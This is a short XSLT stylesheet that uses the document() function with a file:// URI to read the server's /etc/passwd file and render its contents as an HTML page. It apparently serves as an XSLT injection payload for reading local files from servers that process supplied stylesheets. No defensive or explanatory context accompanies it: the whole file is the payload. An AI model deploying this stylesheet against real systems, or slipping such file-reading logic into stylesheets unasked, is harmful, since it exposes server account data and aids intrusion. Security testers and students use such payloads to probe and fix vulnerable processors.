<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:output method="html" indent="yes"/>

  <xsl:template match="/">
    <html>
      <body>
        <h1>/etc/passwd</h1>
        <pre>
<xsl:variable name="f" select="document('file:///etc/passwd')"/>
<xsl:for-each select="$f/text()">
  <xsl:value-of select="."/>
  <xsl:text>&#10;</xsl:text>
</xsl:for-each>
        </pre>
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
